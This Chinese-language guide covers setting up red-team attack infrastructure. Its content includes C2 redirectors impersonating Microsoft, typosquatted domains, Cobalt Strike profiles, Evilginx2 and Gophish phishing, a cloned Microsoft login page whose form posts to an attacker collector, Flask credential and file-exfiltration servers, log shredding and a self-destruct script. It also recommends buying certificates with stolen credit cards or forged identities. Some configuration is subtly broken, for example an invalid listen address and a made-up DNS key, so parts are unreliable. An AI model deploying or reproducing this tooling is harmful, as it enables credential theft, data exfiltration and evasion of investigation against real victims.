# 红队基础设施搭建

## 红队基础设施概述

红队基础设施是模拟真实攻击者所需的技术栈。

### 核心组件

1. **C2 服务器** - 命令与控制
2. **钓鱼服务器** - 邮件钓鱼/恶意网站
3. **重定向器** - 流量转发与混淆
4. **域名与证书** - 伪装与加密
5. **数据收集器** - 窃取数据接收

---

## C2 框架选择

| 框架 | 语言 | 特点 | 检测难度 |
|------|------|------|------------|
| **Cobalt Strike** | Java | 商业、功能强大 | 中 (特征明显) |
| **Sliver** | Go | 开源、跨平台 | 低 (无特征) |
| **Mythic** | Go | 开源、多协议 | 低 |
| **Havoc** | Go | 开源、轻量 | 低 |
| **Metasploit** | Ruby | 开源、功能丰富 | 高 (特征明显) |

---

## 基础设施架构

### 典型架构

```
+-------------+     +-------------+     +-------------+
| 攻击机       | --> | 重定向器     | --> | 目标网络     |
| (Attacker)  |     | (Redirector)|     | (Target)    |
+-------------+     +-------------+     +-------------+
       |                      |                      |
       v                      v                      v
[ C2 Server ]         [防火墙/NAT]         [受害者主机]
[钓鱼服务器]         [流量混淆]            [防御系统]
```

### 设计原则

1. **分层防护** - 多级跳转
2. **快速替换** - 自动化部署
3. **流量混淆** - 伪装成合法流量
4. **数据隔离** - C2 与钓鱼分离

---

## 重定向器 (Redirector) 配置

### Nginx 重定向器

```nginx
# /etc/nginx/sites-available/redirector
server {
    listen 80;
    server_name update.microsoft.com;

    location / {
        return 301 https://$host$request_uri;
    }
}

server {
    listen 443 ssl;
    server_name update.microsoft.com;

    ssl_certificate /etc/letsencrypt/live/update.microsoft.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/update.microsoft.com/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        proxy_pass https://[C2_SERVER_IP];
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_verify off;
    }
}
```

### Socat 重定向器

```bash
# TCP 重定向
socat TCP-LISTEN:80,fork,reuseaddr TCP:[C2_SERVER_IP]:8080

# 带日志的重定向
socat -v TCP-LISTEN:80,fork,reuseaddr TCP:[C2_SERVER_IP]:8080 2> >(tee -a /var/log/redirector.log >&2)
```

### Iptables 重定向器

```bash
# 重定向 HTTP 流量
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination [C2_SERVER_IP]:8080
iptables -t nat -A POSTROUTING -j MASQUERADE

# 保存规则
iptables-save > /etc/iptables/rules.v4
```

---

## 域名伪装

### 1. 抢注域名 (Typosquatting)

**策略：** 注册与目标相似的域名

| 目标域名 | 抢注域名 |
|------------|------------|
| microsoft.com | microsft.com |
| paypal.com | paypa1.com |
| amazon.com | amaxon.com |

**工具：** <br>
- **URLCrazy** - 生成打字错误域名

```bash
# 生成 microsoft.com 的打字错误域名
urlcrazy microsoft.com

# 检查哪些域名可注册
urlcrazy -k microsoft.com
```

### 2. 注册免费域名

**提供商：**

| 提供商 | 域名后缀 | 用途 |
|----------|------------|------|
| Freenom | .tk, .ml, .ga, .cf | 短期活动 |
| EU.org | .eu.org | 长期活动 |
| Dynu | .dynu.net | C2 通信 |

### 3. 被盗用域名

**来源：**
- 过期域名拍卖
- 域名抢注工具

---

## HTTPS 证书

### 1. Let's Encrypt

**优势：** 免费、自动化

```bash
# 安装 Certbot
apt-get install certbot

# 获取证书
certbot certonly --standalone -d update.microsoft.com

# 自动续期
echo "0 0 * * * certbot renew --quiet" | crontab -
```

### 2. 商业证书

**来源：**
- 使用被盗信用卡购买
- 使用伪造身份购买

**注意：** 商业 CA 可能要求身份验证，增加被追踪风险。

---

## C2 _profile 配置

### 1. HTTP C2 Profile

```c
# Cobalt Strike Malleable C2 Profile
set uri "/wp-content/themes/twentyfifteen/sidebar.php";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/wp-content/themes/twentyfifteen/sidebar.php";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Referer" "https://www.microsoft.com/";

        metadata {
            base64;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "text/html; charset=UTF-8";
        header "Server" "Microsoft-IIS/10.0";

        output {
            mask;
            netbios;
            base64;
            append "jQuery.ajax({url: '/wp-admin/admin-ajax.php'});";
            prepend "<script>";
            append "</script>";
        }
    }
}
```

### 2. DNS C2 Profile

```c
# DNS C2 Profile
set dns_idle "1.1.1.1";  # 伪装成 Cloudflare DNS
set dns_sleep 5000;      # 5 秒延迟

dns-beacon {
    # 使用 TXT 记录传输数据
    strategy "round-robin";
    maxdators 3;

    # 伪装成 Google DNS
    beacon {
        dns "www.google.com";
        dns "www.microsoft.com";
    }
}
```

---

## 钓鱼基础设施

### 1. 邮件服务器

#### 使用 Gophish

```bash
# 安装 Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.tar.gz
tar -xzf gophish-v0.12.1-linux-64bit.tar.gz
cd gophish

# 配置 config.json
cat > config.json << EOF
{
  "admin_server": {
    "listen_url": "0.0.0:3333",
    "use_tls": true,
    "cert_path": "cert.pem",
    "key_path": "key.pem"
  },
  "phish_server": {
    "listen_url": "0.0.0:8080",
    "use_tls": true,
    "cert_path": "cert.pem",
    "key_path": "key.pem"
  }
}
EOF

# 启动 Gophish
./gophish
```

#### 使用 SET (Social-Engineer Toolkit)

```bash
# 启动 SET
setoolkit

# 选择攻击向量
1) Social-Engineering Attacks
  2) Penetration Testing (Fast Track)
  3) Third Party Modules
  4) Update the Social-Engineer Toolkit
  5) Update SET configuration
  6) Help, Credits, and About

# 选择 1 (Social-Engineering Attacks)
  1) Spear-Phishing Attack Vectors
  2) Website Attack Vectors
  3) Infectious Media Generator
  4) Create a Payload and Listener
  5) Mass Mailer Attack
  6) Arduino-Based Attack Vector
  7) Wireless Access Point Attack Vector
  8) QRCode Generated Attack Vector

# 选择 1 (Spear-Phishing Attack Vectors)
```

### 2. 恶意网站

#### 克隆合法网站

```bash
# 使用 HTTrack 克隆网站
httrack https://www.microsoft.com -O /var/www/html/microsoft

# 修改登录表单指向收集器
sed -i 's/action="https:\/\/login.microsoft.com"/action="http:\/\/[YOUR_SERVER]\/collect"/g' /var/www/html/microsoft/index.html
```

#### 使用 Evilginx2 (中间人钓鱼)

```bash
# 安装 Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# 配置 Phishlet
cat > phishlets/microsoft.yaml << EOF
name: "Microsoft"
author: "attacker"
min_ver: "2.3.0"
proxy:
  - domain: "login.microsoft.com"
    type: "http"
    ip: "[YOUR_SERVER_IP]"
EOF

# 启动 Evilginx2
./evilginx -p microsoft
```

---

## 数据收集器

### 1. Credential Collector

```python
# Flask 凭据收集器
from flask import Flask, request, redirect
import json

app = Flask(__name__)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.form.to_dict()
    with open('/var/log/credentials.log', 'a') as f:
        f.write(json.dumps(data) + '\n')
    return redirect('https://www.microsoft.com/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')
```

### 2. File Exfiltration Server

```python
# Flask 文件窃取接收器
from flask import Flask, request
import os

app = Flask(__name__)
UPLOAD_FOLDER = '/var/log/exfiltrated/'

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return 'No file', 400

    file = request.files['file']
    filename = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(filename)
    return 'OK', 200

if __name__ == '__main__':
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')
```

---

## 基础设施自动化

### 使用 Terraform 自动化部署

```hcl
# variables.tf
variable "region" {
  default = "us-east-1"
}

variable "c2_server_count" {
  default = 2
}

# main.tf
provider "aws" {
  region = var.region
}

resource "aws_instance" "c2_server" {
  count                  = var.c2_server_count
  ami                    = "ami-0c55b8944f5f4d4b"
  instance_type          = "t2.micro"
  vpc_security_group_ids = [aws_security_group.c2_sg.id]

  user_data = <<-EOF
    #!/bin/bash
    apt-get update
    apt-get install -y nginx
    cat > /etc/nginx/sites-available/c2 << EOG
    server {
        listen 8080;
        location / {
            proxy_pass https://[C2_SERVER_IP]:443;
        }
    }
    EOG
    nginx -s reload
  EOF

  tags = {
    Name = "C2-Redirector-${count.index}"
  }
}

resource "aws_security_group" "c2_sg" {
  name = "c2_sg"

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

### 使用 Ansible 配置管理

```yaml
# playbook.yml
- hosts: c2_servers
  become: yes
  tasks:
    - name: Install Nginx
      apt:
        name: nginx
        state: present

    - name: Configure Nginx as redirector
      copy:
        dest: /etc/nginx/sites-available/c2
        content: |
          server {
              listen 8080;
              location / {
                  proxy_pass https://[C2_SERVER_IP]:443;
              }
          }
      notify:
        - Restart Nginx

    - name: Enable site
      file:
        src: /etc/nginx/sites-available/c2
        dest: /etc/nginx/sites-enabled/c2
        state: link
      notify:
        - Restart Nginx

  handlers:
    - name: Restart Nginx
      service:
        name: nginx
        state: restarted
```

---

## 安全运维

### 1. 日志清理

```bash
# 清除 Bash 历史
unset HISTFILE
export HISTSIZE=0

# 清除系统日志
shred -zu /var/log/auth.log
shred -zu /var/log/syslog
shred -zu /var/log/nginx/access.log
shred -zu /var/log/nginx/error.log

# 清除用户操作日志
rm -f ~/.bash_history
rm -f ~/.zsh_history
```

### 2. 加密通信

```bash
# 使用 GPG 加密数据
gpg --encrypt --recipient victim@target.com stolen_data.tar.gz

# 使用 OpenSSL 加密数据
openssl enc -aes-256-cbc -salt -in stolen_data.tar.gz -out stolen_data.tar.gz.enc
```

### 3. 自毁机制

```bash
# 定时自毁脚本
cat > /usr/local/bin/self_destruct.sh << EOF
#!/bin/bash
# 删除所有日志
shred -zu /var/log/**/*.log

# 删除 SSH 密钥
rm -f /etc/ssh/ssh_host_*

# 删除工具
rm -rf /opt/cobaltstrike/
rm -rf /opt/tools/

# 关机
shutdown -h now
EOF

chmod +x /usr/local/bin/self_destruct.sh

# 设置定时任务 (24 小时后自毁)
echo "0 0 * * * /usr/local/bin/self_destruct.sh" | crontab -
```

---

## 红队基础设施清单

### 规划阶段

- [ ] 确定 C2 框架
- [ ] 注册/抢注域名
- [ ] 申请 Let's Encrypt 证书
- [ ] 设计基础设施架构

### 部署阶段

- [ ] 部署重定向器
- [ ] 部署 C2 服务器
- [ ] 部署钓鱼服务器
- [ ] 配置流量混淆
- [ ] 测试端到端连通性

### 运维阶段

- [ ] 监控服务器状态
- [ ] 轮换域名/证书
- [ ] 清理日志
- [ ] 准备自毁机制

### 撤离阶段

- [ ] 停止所有服务
- [ ] 清除所有日志
- [ ] 销毁服务器/实例
- [ ] 删除域名解析

---

## 延伸阅读

- [Cobalt Strike Malleable C2 Profile](https://www.cobaltstrike.com/help-malleable-c2)
- [Sliver Documentation](https://github.com/BishopFox/sliver)
- [Red Team Infrastructure Wiki](https://github.com/bluscreenofdeath/Red-Team-Infrastructure-Wiki)
- [Advanced Red Team Tactics](https://www.blackhillsinfosec.com/?page_id=5735)

---

**下一步：** 学习 [法律法规](#法律法规)，掌握网络安全相关法律。
